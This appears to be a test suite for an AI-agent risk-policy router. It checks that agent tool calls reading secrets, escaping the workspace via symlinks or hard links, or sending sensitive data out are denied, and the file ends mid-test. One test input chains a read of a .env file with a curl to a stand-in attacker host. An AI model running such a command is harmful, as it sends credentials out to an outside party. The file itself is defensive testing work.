import {test} from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';import os from 'node:os';import path from 'node:path';import {createHash} from 'node:crypto';
process.env.AGENT_CANARY_HOME=fs.mkdtempSync(path.join(os.tmpdir(),'risk-policy-test-'));
const {createAgentGuard,createRiskPolicyRouter,createSecurityToolRouter,PolicyBlockedError,CanaryBlockedError}=await import('../src/sdk.js');
const {createGatewayFileReadCapabilityProvider}=await import('../src/risk-policy.js');
const {readEvents}=await import('../src/alerts.js');
const {createTrustedExecutionGateway,EvidenceRecorder}=await import('../src/sdk.js');
test('multiple routers sharing a Guard serialize sensitive read and egress, including callback failure',async()=>{
 let release!:()=>void;let started!:()=>void;const gate=new Promise<void>(r=>release=r),active=new Promise<void>(r=>started=r);let sent=0;
 const s=setup('BALANCED',{executeRealTool:async()=>{started();await gate;throw new Error('virtual read failed');}});
 const other=createRiskPolicyRouter({guard:s.guard,workspaceRoot:process.cwd(),tools,eventsFile:s.eventsFile,allowedReadOrigins:['https://docs.example.com'],executeRealTool:()=>{sent++;return 'ok';}});
 await assert.rejects(s.router.dispatch({name:'secret'}),PolicyBlockedError);
 const first=s.router.approve(s.router.pendingApprovals()[0].requestId,'human');const handled=assert.rejects(first,/virtual read failed/);await active;
 const network=other.dispatch({name:'http',args:{url:'https://docs.example.com',method:'GET'}});const blocked=assert.rejects(network,(e:any)=>e.decision.reason==='possible_sensitive_egress');release();await handled;await blocked;assert.equal(sent,0);
});
const tools={read:{operation:'file-read'},write:{operation:'file-write'},shell:{operation:'shell'},http:{operation:'http'},secret:{operation:'sensitive-read'},del:{operation:'delete'}} as const;
function setup(mode:'OBSERVE'|'BALANCED'|'STRICT'='BALANCED',extra:Record<string,unknown>={}){
 const eventsFile=path.join(process.env.AGENT_CANARY_HOME!,Math.random()+'.jsonl');
 const guard=createAgentGuard({sessionId:'test-policy',eventsFile,alert:false});const calls:any[]=[];
 const router=createRiskPolicyRouter({guard,workspaceRoot:process.cwd(),mode,tools,eventsFile,allowedReadOrigins:['https://docs.example.com'],executeRealTool:(call:any)=>{calls.push(call);return 'public value';},...extra});return{guard,router,calls,eventsFile};
}
for(const mode of ['OBSERVE','BALANCED','STRICT'] as const){
 test(mode+' permits public read and reviewed shell/HTTPS GET',async()=>{let heldReads=0;const capability=Object.freeze(Object.create(null));const provider={resolve:(call:any)=>call.name==='read'&&call.args.path==='README.md'?capability:undefined,verify:(candidate:any,call:any,operation:string)=>candidate===capability&&call.name==='read'&&call.args.path==='README.md'&&operation==='file-read',readFileWithCapability:async()=>{heldReads++;return 'public value';}};const s=setup(mode,mode==='STRICT'?{fileReadCapability:provider}:{});await s.router.dispatch({name:'read',args:{path:'README.md'}});await s.router.dispatch({name:'shell',args:{command:'ls -la'}});await s.router.dispatch({name:'http',args:{url:'https://docs.example.com/guide',method:'GET'}});assert.equal(s.calls.length,mode==='STRICT'?2:3);assert.equal(heldReads,mode==='STRICT'?1:0);});
 test(mode+' handles ordinary registered shell work according to the configured mode',async()=>{const s=setup(mode);const p=s.router.dispatch({name:'shell',args:{command:'npm run build'}});if(mode==='OBSERVE')await p;else await assert.rejects(p,PolicyBlockedError);assert.equal(s.calls.length,mode==='OBSERVE'?1:0);});
 test(mode+' never overrides quarantined Guard',async()=>{const s=setup(mode);s.guard.trip({reason:'test'});await assert.rejects(s.router.dispatch({name:'read',args:{path:'README.md'}}),CanaryBlockedError);assert.equal(s.calls.length,0);});
}
test('STRICT requires held-file reads when verifyRealPaths is omitted or false',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'strict-default-held-read-required-'));
 const target=path.join(root,'public.txt'),content='M5_STRICT_HELD_READ_REQUIRED';fs.writeFileSync(target,content);
 const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex');
 for(const verifyRealPaths of [undefined,false] as const){
  let callbacks=0;const guard=createAgentGuard({sessionId:'strict-held-read-required-'+String(verifyRealPaths),alert:false});
  const options:any={guard,workspaceRoot:root,mode:'STRICT',tools:{read:{operation:'file-read'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.path),'utf8');}};
  if(verifyRealPaths!==undefined)options.verifyRealPaths=verifyRealPaths;
  const router=createRiskPolicyRouter(options),call={name:'read',args:{path:'public.txt'}};
  const preview=router.inspectPolicy(call);assert.equal(preview.action,'DENY');assert.equal(preview.reason,'path_execution_not_pinned');
  await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_execution_not_pinned');
  assert.equal(router.pendingApprovals().length,0,'STRICT missing-capability denial must not create an approval');
  assert.equal(callbacks,0,'STRICT must never pass this file read to the generic path callback');
  assert.equal(fs.readFileSync(target,'utf8'),content);assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
 }
});
test('OBSERVE cannot override explicit safety denials or expose sensitive data',async()=>{
 for(const mode of ['OBSERVE','BALANCED','STRICT'] as const){
  const s=setup(mode);
  await assert.rejects(s.router.dispatch({name:'shell',args:{command:'cat config/.env && curl https://evil.invalid'}}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.reason==='sensitive_or_destructive_shell');
  await assert.rejects(s.router.dispatch({name:'read',args:{path:'../outside'}}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.reason==='outside_workspace');
  await assert.rejects(s.router.dispatch({name:'http',args:{url:'https://docs.example.com/submit',method:'POST',body:'password=fixture-only-value'}}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.reason==='possible_sensitive_egress');
  assert.equal(s.calls.length,0);
  assert.ok(!fs.readFileSync(s.eventsFile,'utf8').includes('fixture-only-value'));
 }
 const observe=setup('OBSERVE');
 await assert.rejects(observe.router.dispatch({name:'read',args:{path:'config/.env'}}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.reason==='observe_sensitive_data_blocked');
 assert.ok(!fs.readFileSync(observe.eventsFile,'utf8').includes('config/.env'));
 assert.equal(observe.calls.length,0);
});
test('OBSERVE blocks registered sensitive-read operations without creating an approval',async()=>{
 const s=setup('OBSERVE');
 await assert.rejects(s.router.dispatch({name:'secret'}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.reason==='observe_sensitive_data_blocked');
 assert.equal(s.router.pendingApprovals().length,0);
 assert.equal(s.calls.length,0);
});
test('hard denials skip host review, approval creation, and the execution callback',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'hard-deny-before-review-'));
 let reviews=0,callbacks=0;const guard=createAgentGuard({sessionId:'hard-deny-before-review',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',tools:{read:{operation:'file-read'}},reviewDecision:async()=>{reviews++;return 'UNCHANGED';},executeRealTool:()=>{callbacks++;return 'must-not-run';}});
 await assert.rejects(router.dispatch({name:'read',args:{path:'.env'}}),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='observe_sensitive_data_blocked');
 assert.equal(reviews,0);assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);
});
test('M5 OBSERVE policy blocks sensitive file aliases and canonical path variants before approval or callback',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'observe-path-alias-'));
 const secret=path.join(root,'secrets','fixture.txt'),content='M5_CANARY_SECRET';fs.mkdirSync(path.dirname(secret));fs.writeFileSync(secret,content);
 fs.symlinkSync(path.join(root,'secrets'),path.join(root,'public'),process.platform==='win32'?'junction':'dir');
 const before=createHash('sha256').update(fs.readFileSync(secret)).digest('hex');let callbacks=0;const guard=createAgentGuard({sessionId:'test-observe-path-alias',alert:false});
 // Exercise M5's own canonical-path policy without the M1 pre-execution adapter.
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}});
 for(const file_path of ['public/fixture.txt','secrets/../secrets/fixture.txt','secrets\\fixture.txt']){
  await assert.rejects(router.dispatch({name:'READ',args:{file_path}}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.action==='DENY'&&e.decision.reason==='observe_sensitive_data_blocked'&&e.decision.risks.includes('SENSITIVE_DATA'));
  assert.equal(router.pendingApprovals().length,0);
  assert.equal(callbacks,0);
  assert.equal(fs.readFileSync(secret,'utf8'),content);assert.equal(createHash('sha256').update(fs.readFileSync(secret)).digest('hex'),before);
 }
});
test('M5 OBSERVE blocks sensitive aliases and workspace escapes by default and when real-path checks are explicitly false',async()=>{
 const base=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'observe-default-path-boundary-'));
 const root=path.join(base,'workspace'),outside=path.join(base,'outside'),secret=path.join(root,'secrets','.env'),sentinel=path.join(outside,'sentinel.txt');
 fs.mkdirSync(path.dirname(secret),{recursive:true});fs.mkdirSync(outside);fs.writeFileSync(secret,'M5_DEFAULT_OBSERVE_SECRET');fs.writeFileSync(sentinel,'M5_DEFAULT_OBSERVE_OUTSIDE');
 fs.symlinkSync(path.dirname(secret),path.join(root,'linked'),process.platform==='win32'?'junction':'dir');
 fs.symlinkSync(outside,path.join(root,'escaped'),process.platform==='win32'?'junction':'dir');
 const secretBefore=createHash('sha256').update(fs.readFileSync(secret)).digest('hex'),outsideBefore=createHash('sha256').update(fs.readFileSync(sentinel)).digest('hex');
 for(const verifyRealPaths of [undefined,false]){
  let callbacks=0;const guard=createAgentGuard({sessionId:'test-observe-default-path-boundary-'+String(verifyRealPaths),alert:false});
  const config:any={guard,workspaceRoot:root,mode:'OBSERVE',tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}};
  if(verifyRealPaths!==undefined)config.verifyRealPaths=verifyRealPaths;
  const router=createRiskPolicyRouter(config);
  for(const [file_path,reason] of [['linked/.env','observe_sensitive_data_blocked'],['secrets/../secrets/.env','observe_sensitive_data_blocked'],['escaped/sentinel.txt','outside_workspace'],['../outside/sentinel.txt','outside_workspace']] as const){
   const call={name:'read',args:{file_path}},decision=router.inspectPolicy(call);assert.equal(decision.action,'DENY');assert.equal(decision.reason,reason);
   await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason===reason);
   assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);assert.equal(guard.state,'SAFE');
   assert.equal(createHash('sha256').update(fs.readFileSync(secret)).digest('hex'),secretBefore);assert.equal(createHash('sha256').update(fs.readFileSync(sentinel)).digest('hex'),outsideBefore);
  }
 }
});
test('M5 OBSERVE rejects a symlink alias before a following dot-dot can hide it from path resolution',async()=>{
 const base=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'observe-alias-dotdot-'));
 const root=path.join(base,'workspace'),outside=path.join(base,'outside'),sub=path.join(outside,'sub');
 fs.mkdirSync(root);fs.mkdirSync(sub,{recursive:true});
 fs.writeFileSync(path.join(root,'victim.txt'),'M5_WORKSPACE_VICTIM');fs.writeFileSync(path.join(outside,'victim.txt'),'M5_OUTSIDE_VICTIM');
 fs.symlinkSync(sub,path.join(root,'linked'),process.platform==='win32'?'junction':'dir');
 const before=createHash('sha256').update(fs.readFileSync(path.join(outside,'victim.txt'))).digest('hex');let callbacks=0;
 const guard=createAgentGuard({sessionId:'test-observe-alias-dotdot',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',tools:{read:{operation:'file-read'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(root+path.sep+String(call.args.path),'utf8');}});
 const call={name:'read',args:{path:'linked/../victim.txt'}};
 const decision=router.inspectPolicy(call);assert.equal(decision.action,'DENY');assert.equal(decision.reason,'path_alias_rejected');
 await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_alias_rejected');
 assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);assert.equal(guard.state,'SAFE');
 assert.equal(fs.readFileSync(path.join(outside,'victim.txt'),'utf8'),'M5_OUTSIDE_VICTIM');
 assert.equal(createHash('sha256').update(fs.readFileSync(path.join(outside,'victim.txt'))).digest('hex'),before);
});
test('M5 verified real-path policy denies an outside-workspace junction before the file-read callback',async()=>{
 const base=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'outside-junction-risk-policy-'));
 const root=path.join(base,'workspace'),outside=path.join(base,'outside'),sentinel=path.join(outside,'sentinel.txt');
 fs.mkdirSync(root);fs.mkdirSync(outside);fs.writeFileSync(sentinel,'SYNTHETIC_OUTSIDE_SENTINEL');
 const sentinelBefore=createHash('sha256').update(fs.readFileSync(sentinel)).digest('hex');
 fs.symlinkSync(outside,path.join(root,'public'),process.platform==='win32'?'junction':'dir');
 let callbacks=0;const guard=createAgentGuard({sessionId:'test-risk-policy-outside-junction',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}});
 const call={name:'read',args:{file_path:'public/sentinel.txt'}};const decision=router.inspectPolicy(call);
 assert.equal(decision.action,'DENY');assert.equal(decision.reason,'outside_workspace');
 await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='outside_workspace');
 assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);
 assert.equal(fs.readFileSync(sentinel,'utf8'),'SYNTHETIC_OUTSIDE_SENTINEL');
 assert.equal(createHash('sha256').update(fs.readFileSync(sentinel)).digest('hex'),sentinelBefore);
});
test('M5 rejects hard-link file aliases before approval or callback in OBSERVE',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'observe-hardlink-alias-'));
 const secret=path.join(root,'secrets','fixture.txt'),alias=path.join(root,'public.txt');fs.mkdirSync(path.dirname(secret));fs.writeFileSync(secret,'M5_HARDLINK_SECRET');fs.linkSync(secret,alias);
 const before=createHash('sha256').update(fs.readFileSync(secret)).digest('hex');let callbacks=0;const guard=createAgentGuard({sessionId:'test-observe-hardlink-alias',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:()=>{callbacks++;return 'must-not-run';}});
 const call={name:'read',args:{file_path:'public.txt'}};const decision=router.inspectPolicy(call);
 assert.equal(decision.action,'DENY');assert.equal(decision.reason,'path_alias_rejected');
 await assert.rejects(router.dispatch(call),(e:any)=>e instanceof PolicyBlockedError&&e.decision.reason==='path_alias_rejected');
 assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);assert.equal(fs.readFileSync(secret,'utf8'),'M5_HARDLINK_SECRET');assert.equal(createHash('sha256').update(fs.readFileSync(secret)).digest('hex'),before);
});
test('verifyRealPaths blocks path-based file callbacks before read/write/delete reopen TOCTOU',async()=>{
 for(const routerKind of ['risk-policy','security-router'] as const)for(const operation of ['file-read','file-write','delete'] as const){
  const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,`path-reopen-${routerKind}-${operation}-`)),outside=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'path-reopen-outside-'));
  const target=path.join(root,'public.txt'),sentinel=path.join(outside,'sentinel.txt');fs.writeFileSync(target,'M5_PUBLIC_FIXTURE');fs.writeFileSync(sentinel,'SYNTHETIC_OUTSIDE_SENTINEL');
  let filesystemCallbacks=0,safeCallbacks=0;const guard=createAgentGuard({sessionId:'test-path-reopen-'+routerKind+'-'+operation,alert:false});
  const executeRealTool=(call:any)=>{if(call.name==='fs'){filesystemCallbacks++;fs.unlinkSync(target);fs.linkSync(sentinel,target);if(operation==='file-read')return fs.readFileSync(path.join(root,call.args.file_path),'utf8');if(operation==='file-write')fs.writeFileSync(target,'SYNTHETIC_OUTSIDE_OVERWRITE');else fs.unlinkSync(target);return 'mutated';}safeCallbacks++;return 'M5_SAFE_HTTP_FIXTURE';};
  const options={guard,workspaceRoot:root,mode:'OBSERVE' as const,verifyRealPaths:true,allowedReadOrigins:['https://docs.example.com'],tools:{fs:{operation,pathArg:'file_path'},http:{operation:'http' as const,urlArg:'url'}},executeRealTool};
  const router=routerKind==='risk-policy'?createRiskPolicyRouter(options):createSecurityToolRouter(options);
  const call={name:'fs',args:{file_path:'public.txt'}};
  const decision=routerKind==='risk-policy'?router.inspectPolicy(call):await router.decide(call);
  assert.equal(decision.action,'DENY');assert.equal(decision.reason,'path_execution_not_pinned');
  await assert.rejects(router.dispatch(call),(e:any)=>e instanceof PolicyBlockedError&&e.decision.action==='DENY'&&e.decision.reason==='path_execution_not_pinned');
  assert.equal(router.pendingApprovals().length,0);assert.equal(filesystemCallbacks,0);assert.equal(safeCallbacks,0);assert.equal(fs.readFileSync(target,'utf8'),'M5_PUBLIC_FIXTURE');assert.equal(fs.readFileSync(sentinel,'utf8'),'SYNTHETIC_OUTSIDE_SENTINEL');
  assert.equal(await router.dispatch({name:'http',args:{url:'https://docs.example.com/guide',method:'GET'}}),'M5_SAFE_HTTP_FIXTURE');assert.equal(filesystemCallbacks,0);assert.equal(safeCallbacks,1);
 }
});
test('verifyRealPaths hard-denies missing, mismatched, or expired read capabilities before approval or callback',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'strict-read-capability-deny-'));
 const target=path.join(root,'config','.env');fs.mkdirSync(path.dirname(target));fs.writeFileSync(target,'M5_CAPABILITY_SECRET_FIXTURE');
 const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex');
 const capability=Object.freeze(Object.create(null)),wrongCapability=Object.freeze(Object.create(null));
 for(const scenario of ['missing','mismatched','expired-during-review'] as const){
  let live=true,callbacks=0;
  const provider={
   resolve:()=>scenario==='missing'?undefined:scenario==='mismatched'?wrongCapability:capability,
   verify:(candidate:any,call:any,operation:string)=>candidate===capability&&live&&operation==='file-read'&&call.name==='read'&&call.args.path==='config/.env',
   readFileWithCapability:async()=>{throw Error('denied read must not reach the held-file provider');},
  };
  const guard=createAgentGuard({sessionId:'test-read-capability-'+scenario,alert:false});
  const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'BALANCED',verifyRealPaths:true,tools:{read:{operation:'file-read'}},fileReadCapability:provider,reviewDecision:async()=>{if(scenario==='expired-during-review')live=false;return 'UNCHANGED';},executeRealTool:()=>{callbacks++;return 'must-not-run';}});
  const call={name:'read',args:{path:'config/.env'}};
  if(scenario!=='expired-during-review'){const preview=router.inspectPolicy(call);assert.equal(preview.action,'DENY');assert.equal(preview.reason,'path_execution_not_pinned');}
  await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_execution_not_pinned');
  assert.equal(router.pendingApprovals().length,0,scenario+' must not create an approval');
  assert.equal(callbacks,0,scenario+' must not enter the registered callback');
  assert.equal(fs.readFileSync(target,'utf8'),'M5_CAPABILITY_SECRET_FIXTURE');
  assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
 }
});
test('a verified capability cannot authorize a path-only strict-read callback',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'strict-read-path-callback-'));
 const target=path.join(root,'public.txt'),content='M5_PATH_CALLBACK_MUST_NOT_READ';fs.writeFileSync(target,content);
 const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex');
 const capability=Object.freeze(Object.create(null));let callbacks=0;
 // Deliberately unsafe legacy provider shape: runtime policy must reject it.
 const fileReadCapability={resolve:()=>capability,verify:(candidate:any)=>candidate===capability};
 const guard=createAgentGuard({sessionId:'strict-read-path-callback',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read'}},fileReadCapability:fileReadCapability as any,
  executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.path),'utf8');}});
 const call={name:'read',args:{path:'public.txt'}};
 assert.equal(router.inspectPolicy(call).action,'DENY');
 assert.equal(router.inspectPolicy(call).reason,'path_execution_not_pinned');
 await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_execution_not_pinned');
 assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0,'a valid token alone must never reach a path-only callback');
 assert.equal(fs.readFileSync(target,'utf8'),content);assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
});
test('OBSERVE cannot downgrade a mismatched read capability',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'observe-mismatched-read-capability-'));
 const target=path.join(root,'public.txt');fs.writeFileSync(target,'M5_OBSERVE_CAPABILITY_FIXTURE');const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex');
 const forged=Object.freeze(Object.create(null));let callbacks=0;
 const guard=createAgentGuard({sessionId:'observe-mismatched-read-capability',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read'}},fileReadCapability:{resolve:()=>forged,verify:()=>false},executeRealTool:()=>{callbacks++;return 'must-not-run';}});
 const call={name:'read',args:{path:'public.txt'}};
 const preview=router.inspectPolicy(call);assert.equal(preview.action,'DENY');assert.equal(preview.reason,'path_execution_not_pinned');
 await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_execution_not_pinned');
 assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);assert.equal(fs.readFileSync(target,'utf8'),'M5_OBSERVE_CAPABILITY_FIXTURE');assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
});
test('inspectPolicy previews an OBSERVE held-capability read without callback, audit, review, or approval effects',()=>{
 const root=fs.realpathSync(fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'inspect-policy-preview-')));
 const target=path.join(root,'public.txt'),secret=path.join(root,'.env'),eventsFile=path.join(root,'events.jsonl');
 fs.writeFileSync(target,'M5_INSPECT_POLICY_PUBLIC_FIXTURE');fs.writeFileSync(secret,'M5_INSPECT_POLICY_SECRET_FIXTURE');
 const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex'),capability=Object.freeze(Object.create(null));
 let resolves=0,verifies=0,reviews=0,callbacks=0;
 const fileReadCapability={resolve:(call:any)=>{resolves++;return call.args.path==='public.txt'?capability:undefined;},verify:(candidate:any,call:any,operation:string)=>{verifies++;return candidate===capability&&call.name==='read'&&call.args.path==='public.txt'&&operation==='file-read';},readFileWithCapability:async()=>{throw Error('inspectPolicy must not read');}};
 const guard=createAgentGuard({sessionId:'inspect-policy-preview',eventsFile,alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read'},write:{operation:'file-write'}},fileReadCapability,eventsFile,reviewDecision:async()=>{reviews++;return 'UNCHANGED';},executeRealTool:()=>{callbacks++;return 'must-not-run';}});
 const safe=router.inspectPolicy({name:'READ',args:{path:'public.txt'}});
 assert.equal(safe.action,'ALLOW');assert.equal(safe.reason,'read_only');assert.equal(safe.mode,'OBSERVE');
 assert.equal(resolves,1);assert.equal(verifies,1,'preview validates the held-file capability');
 const sensitive=router.inspectPolicy({name:'read',args:{path:'.env'}});
 assert.equal(sensitive.action,'DENY');assert.equal(sensitive.reason,'observe_sensitive_data_blocked');
 const strict=createRiskPolicyRouter({guard:createAgentGuard({sessionId:'inspect-policy-strict',alert:false}),workspaceRoot:root,mode:'STRICT',verifyRealPaths:true,tools:{write:{operation:'file-write'}},fileReadCapability,executeRealTool:()=>{callbacks++;return 'must-not-run';}});
 const write=strict.inspectPolicy({name:'write',args:{path:'public.txt'}});
 assert.equal(write.action,'DENY');assert.equal(write.reason,'path_execution_not_pinned');
 assert.equal(router.pendingApprovals().length,0);assert.equal(strict.pendingApprovals().length,0);
 assert.equal(reviews,0);assert.equal(callbacks,0);assert.equal(guard.state,'SAFE');assert.equal(fs.existsSync(eventsFile),false,'preview must not append an audit event');
 assert.equal(fs.readFileSync(target,'utf8'),'M5_INSPECT_POLICY_PUBLIC_FIXTURE');assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
});
test('trusted read token is rechecked at the final M5 boundary before held-file read',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'strict-read-capability-callback-'));
 const target=path.join(root,'public.txt');fs.writeFileSync(target,'M5_PUBLIC_CAPABILITY_FIXTURE');
 const capability=Object.freeze(Object.create(null));let verifyCalls=0,callbacks=0;
 const fileReadCapability={resolve:()=>capability,verify:(candidate:any,call:any,operation:string)=>{
  verifyCalls++;return verifyCalls<5&&candidate===capability&&operation==='file-read'&&call.name==='read'&&call.args.path==='public.txt';
 },readFileWithCapability:async()=> 'must-not-run-after-expiry'};
 const guard=createAgentGuard({sessionId:'test-read-capability-final-check',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read'}},fileReadCapability,executeRealTool:(_call:any,context:any)=>{callbacks++;assert.equal(context.fileReadCapability,capability);return 'must-not-run';}});
 const call={name:'read',args:{path:'public.txt'}};
 assert.equal(router.inspectPolicy(call).action,'ALLOW');
 await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_execution_not_pinned');
 assert.equal(verifyCalls,5,'M5 must revalidate the same opaque token immediately before the held-file provider call');
 assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);
 assert.equal(fs.readFileSync(target,'utf8'),'M5_PUBLIC_CAPABILITY_FIXTURE');
});
test('M5 Gateway adapter binds fixed M1 capabilities and routes only the exact held-file read',async()=>{
 const capability=Object.freeze(Object.create(null));let binds=0,verifies=0,reads=0,genericCallbacks=0;
 const gateway={
  bindFileReadCapability(binding:any){binds++;assert.deepEqual(binding,{toolName:'read_public',path:'public.txt',pathArg:'file_path',operation:'file-read'});return capability;},
  verifyFileReadCapability(candidate:any,call:any,operation:string){verifies++;return candidate===capability&&operation==='file-read'&&call.name==='read_public'&&Object.keys(call.args).length===1&&call.args.file_path==='public.txt';},
  async readFileWithCapability(candidate:any,call:any,operation:string){reads++;assert.equal(candidate,capability);assert.equal(call.name,'read_public');assert.equal(call.args.file_path,'public.txt');assert.equal(operation,'file-read');return 'M1_HELD_FILE_PUBLIC_FIXTURE';},
 };
 const provider=createGatewayFileReadCapabilityProvider(gateway,[{toolName:'read_public',path:'public.txt',pathArg:'file_path'}]);
 assert.equal(binds,1,'only the fixed host binding is issued');
 const call={name:'read_public',args:{file_path:'public.txt'}};
 const guard=createAgentGuard({sessionId:'m5-gateway-capability-adapter',alert:false});
 const router=createRiskPolicyRouter({guard,workspaceRoot:process.cwd(),mode:'OBSERVE',verifyRealPaths:true,tools:{read_public:{operation:'file-read',pathArg:'file_path'}},fileReadCapability:provider,executeRealTool:(actual)=>{genericCallbacks++;return fs.readFileSync(path.resolve(actual.args.file_path),'utf8');}});
 assert.equal(await router.dispatch(call),'M1_HELD_FILE_PUBLIC_FIXTURE');
 assert.ok(verifies>=3,'M5 verifies the issued capability during policy, execution, and held-file read');assert.equal(reads,1);assert.equal(genericCallbacks,0,'strict reads must use the held-file provider, never the generic path callback');
 for(const alias of [
  {name:'read_public',args:{file_path:'public/../public.txt'}},
  {name:'read_public',args:{file_path:'public.txt',path:'public.txt'}},
  {name:'other_tool',args:{file_path:'public.txt'}},
 ]){
  assert.equal(provider.resolve(alias as any),undefined,'aliases, extra arguments, and unbound tools resolve no capability');
  assert.equal(provider.verify(capability,alias as any,'file-read'),false);
  await assert.rejects(provider.readFileWithCapability(capability,alias as any),/POLICY_FILE_READ_CAPABILITY_INVALID/);
 }
 await assert.rejects(provider.readFileWithCapability(Object.freeze(Object.create(null)),call),/POLICY_FILE_READ_CAPABILITY_INVALID/);
 assert.equal(reads,1,'rejected aliases and forged capabilities never reach M1 read');
 assert.throws(()=>createGatewayFileReadCapabilityProvider({bindFileReadCapability:gateway.bindFileReadCapability,verifyFileReadCapability:gateway.verifyFileReadCapability} as any,[{toolName:'read_public',path:'public.txt'}]),/POLICY_GATEWAY_FILE_READ_API_INVALID/);
});
test('strict read positive control uses the real M1 held-file Gateway, not a path callback',async()=>{
 const root=fs.realpathSync(fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'m5-real-gateway-held-read-')));
 const target=path.join(root,'public.txt'),content='M5_REAL_M1_HELD_FILE_READ_FIXTURE';fs.writeFileSync(target,content);
 const guard=createAgentGuard({sessionId:'m5-real-gateway-held-read',alert:false});
 const gateway=createTrustedExecutionGateway({agentId:'m5-held-read-test',guard,workspaceRoot:root,files:[{path:'public.txt'}],evidence:new EvidenceRecorder()}) as any;
 try{
  const provider=createGatewayFileReadCapabilityProvider(gateway,[{toolName:'read_public',path:'public.txt',pathArg:'file_path'}]);let genericCallbacks=0;
  const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'STRICT',tools:{read_public:{operation:'file-read',pathArg:'file_path'}},fileReadCapability:provider,
   executeRealTool:(call:any)=>{genericCallbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}});
